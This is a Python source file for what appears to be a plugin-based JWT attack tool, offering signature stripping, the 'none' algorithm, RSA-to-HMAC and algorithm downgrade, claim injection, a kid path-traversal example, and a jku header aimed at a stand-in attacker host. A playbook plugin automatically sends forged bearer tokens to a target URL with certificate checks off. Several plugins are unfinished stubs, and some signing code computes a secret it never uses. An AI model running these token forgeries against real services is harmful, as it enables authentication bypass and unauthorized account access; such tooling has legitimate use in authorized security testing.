import base64
import json
import jwt
from datetime import datetime
import os
import requests
from Cryptodome.PublicKey import RSA
import re

class PluginBase:
    def __init__(self, logic):
        self.logic = logic
        self.description = "Base plugin for JWT exploitation"
        self.options = {}
        self.example_usage = []

    def set_param(self, param, value):
        if param in self.options:
            setattr(self, param, value)
            return f"Set {param} to {value}"
        return f"Parameter {param} not supported by this plugin."

class SigNonePlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Use `none` algorithm to bypass signature verification"
        self.options = {
            "token": {"description": "JWT to modify", "required": True, "default": None}
        }
        self.example_usage = ["set token <jwt>", "run"]

    def run(self):
        if not self.logic.tokens.get(self.logic.current_id):
            return "No token set."
        token = self.logic.tokens[self.logic.current_id]["token"]
        return token.rsplit(".", 1)[0] + "."

class AlgKidPlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Abuse `kid` parameter to access sensitive keys"
        self.kid = None
        self.secret = None
        self.options = {
            "kid": {"description": "Key ID to inject", "required": True, "default": None},
            "secret": {"description": "Secret key for signing", "required": False, "default": None}
        }
        self.example_usage = ["set kid ../../etc/passwd", "set secret mysecret", "run"]

    def run(self):
        return "alg_kid plugin not fully implemented yet."

class RsToHsPlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Convert RSA to HMAC for signing attacks"
        self.secret = None
        self.options = {
            "secret": {"description": "HMAC secret", "required": True, "default": None}
        }
        self.example_usage = ["set secret mysecret", "run"]

    def run(self):
        return "rs_to_hs plugin not fully implemented yet."

class BruteForcePlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Attempt to brute-force the secret key"
        self.wordlist = None
        self.options = {
            "wordlist": {"description": "Path to wordlist", "required": True, "default": None}
        }
        self.example_usage = ["set wordlist /path/to/wordlist.txt", "run"]

    def run(self):
        return "brute_force plugin not fully implemented yet."

class ClaimInjectPlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Inject claims into JWT payload"
        self.payload = None
        self.header = None
        self.secret = None
        self.algorithm = "HS256"
        self.options = {
            "payload": {"description": "JSON string to inject", "required": True, "default": None},
            "header": {"description": "Custom JWT header", "required": False, "default": None},
            "secret": {"description": "Secret key for signing", "required": False, "default": None},
            "algorithm": {"description": "Signing algorithm", "required": False, "default": "HS256"}
        }
        self.example_usage = ["set payload '{\"admin\": true}'", "set algorithm HS256", "run"]

    def run(self):
        return "claim_inject plugin not fully implemented yet."

class TimeFuzzPlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Test for time-based vulnerabilities"
        self.offset = "3600"
        self.options = {
            "offset": {"description": "Time offset in seconds", "required": True, "default": "3600"}
        }
        self.example_usage = ["set offset 7200", "run"]

    def run(self):
        return "time_fuzz plugin not fully implemented yet."

class ArbitrarySigPlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Sign JWT with arbitrary key"
        self.secret = None
        self.options = {
            "secret": {"description": "Arbitrary secret key", "required": True, "default": None}
        }
        self.example_usage = ["set secret arbitrarykey", "run"]

    def run(self):
        return "arbitrary_sig plugin not fully implemented yet."

class KidInjectionPlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Inject malicious `kid` values"
        self.kid = None
        self.options = {
            "kid": {"description": "Key ID to inject", "required": True, "default": None}
        }
        self.example_usage = ["set kid malicious_kid", "run"]

    def run(self):
        return "kid_inject plugin not fully implemented yet."

class TokenChainPlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Chain multiple token manipulations"
        self.secret = "default_secret"
        self.options = {
            "secret": {"description": "Secret key for signing", "required": False, "default": "default_secret"}
        }
        self.example_usage = ["add_token <jwt1>", "add_token <jwt2>", "set secret mysecret", "run"]

    def run(self):
        if len(self.logic.tokens) < 2:
            return "At least two tokens required. Use 'add_token'."
        combined_payload = {}
        for tid, data in self.logic.tokens.items():
            combined_payload.update(data["decoded"])
        header = {"alg": "HS256", "typ": "JWT"}
        secret = self.logic.tokens[list(self.logic.tokens.keys())[0]]["secret"] or self.secret
        return self.logic.sign_hs(header, combined_payload)

class SigStripPlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Strip signature to test validation behavior"
        self.options = {
            "token": {"description": "JWT to strip", "required": True, "default": None}
        }
        self.example_usage = ["set token <jwt>", "run"]

    def run(self):
        if not self.logic.tokens.get(self.logic.current_id):
            return "No token set."
        token = self.logic.tokens[self.logic.current_id]["token"]
        return token.rsplit(".", 1)[0] + "."

class AlgDowngradePlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Downgrade JWT algorithm for easier exploitation"
        self.secret = "downgraded"
        self.options = {
            "secret": {"description": "Secret key for HMAC", "required": False, "default": "downgraded"}
        }
        self.example_usage = ["set secret mysecret", "run"]

    def run(self):
        if not self.logic.tokens.get(self.logic.current_id):
            return "No token set."
        header = jwt.get_unverified_header(self.logic.tokens[self.logic.current_id]["token"])
        payload = self.logic.tokens[self.logic.current_id]["decoded"]
        if header["alg"].startswith("RS") or header["alg"].startswith("ES"):
            header["alg"] = "HS256"
            secret = self.logic.tokens[self.logic.current_id]["secret"] or self.secret
            return self.logic.sign_hs(header, payload)
        return "Algorithm already weak or unsupported."

class DynamicPlaybookPlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Automated JWT attack chaining"
        self.target_url = None
        self.proxy = None
        self.custom_headers = {}
        self.success_regex = None
        self.options = {
            "target_url": {"description": "Target URL to test", "required": True, "default": None},
            "proxy": {"description": "Proxy URL", "required": False, "default": None},
            "header": {"description": "Custom header (key:value)", "required": False, "default": None},
            "success_regex": {"description": "Regex for success detection", "required": False, "default": None}
        }
        self.example_usage = ["set target_url http://example.com", "set success_regex 'success'", "run"]

    def set_target_url(self, url):
        self.target_url = url

    def set_proxy(self, proxy):
        self.proxy = {"http": proxy, "https": proxy}

    def set_header(self, key, value):
        self.custom_headers[key] = value

    def set_success_regex(self, regex):
        self.success_regex = regex

    def run(self):
        if not self.logic.tokens.get(self.logic.current_id):
            return "No token set."
        if not self.target_url:
            return "No target URL set. Use 'set target_url <url>'."
        
        output = ["Running Dynamic JWT Playbook..."]
        header = jwt.get_unverified_header(self.logic.tokens[self.logic.current_id]["token"])
        payload = self.logic.tokens[self.logic.current_id]["decoded"]
        alg = header["alg"].lower()

        exploits = []
        if "hs" in alg:
            exploits.extend(["sig_none", "blank_pw", "time_fuzz"])
        elif "rs" in alg or "es" in alg:
            exploits.extend(["rs_to_hs", "jwks_spoof", "alg_downgrade"])
        exploits.append("sig_strip")

        for exploit in exploits:
            token = self._generate_exploit(exploit, header, payload)
            result = self._send_token(token, exploit)
            output.append(result)
            if self.success_regex and "Success" in result:
                output.append(f"[+] Potential vuln found with {exploit}. Refining...")
                refined = self._refine_exploit(exploit, header, payload)
                output.append(self._send_token(refined, f"Refined {exploit}"))
        
        return "\n".join(output)

    def _generate_exploit(self, exploit, header, payload):
        if exploit == "sig_none":
            return self.logic.tokens[self.logic.current_id]["token"].rsplit(".", 1)[0] + "."
        elif exploit == "blank_pw":
            self.logic.set_secret("")
            return self.logic.sign_hs(header, payload)
        elif exploit == "time_fuzz":
            payload["exp"] = int(datetime.now().timestamp()) + 3600
            return self.logic.sign_hs(header, payload)
        elif exploit == "rs_to_hs":
            header["alg"] = "HS256"
            return self.logic.sign_hs(header, payload)
        elif exploit == "jwks_spoof":
            header["jku"] = "http://attacker.com/jwks.json"
            return self.logic.sign_hs(header, payload)
        elif exploit == "alg_downgrade":
            header["alg"] = "HS256"
            return self.logic.sign_hs(header, payload)
        elif exploit == "sig_strip":
            return self.logic.tokens[self.logic.current_id]["token"].rsplit(".", 1)[0] + "."

    def _refine_exploit(self, exploit, header, payload):
        if exploit == "time_fuzz":
            payload["exp"] = int(datetime.now().timestamp()) + 86400
            return self.logic.sign_hs(header, payload)
        return self._generate_exploit(exploit, header, payload)

    def _send_token(self, token, desc):
        try:
            headers = {"Authorization": f"Bearer {token}", **self.custom_headers}
            resp = requests.get(self.target_url, headers=headers, proxies=self.proxy, verify=False)
            result = f"{desc}: Status {resp.status_code}, Size {len(resp.content)} bytes"
            if self.success_regex and re.search(self.success_regex, resp.text):
                result += " [Success]"
            return result
        except Exception as e:
            return f"{desc}: Error - {str(e)}"

PLUGINS = {
    "sig_none": SigNonePlugin,
    "alg_kid": AlgKidPlugin,
    "rs_to_hs": RsToHsPlugin,
    "brute_force": BruteForcePlugin,
    "claim_inject": ClaimInjectPlugin,
    "time_fuzz": TimeFuzzPlugin,
    "arbitrary_sig": ArbitrarySigPlugin,
    "kid_inject": KidInjectionPlugin,
    "token_chain": TokenChainPlugin,
    "sig_strip": SigStripPlugin,
    "alg_downgrade": AlgDowngradePlugin,
    "dynamic_playbook": DynamicPlaybookPlugin
}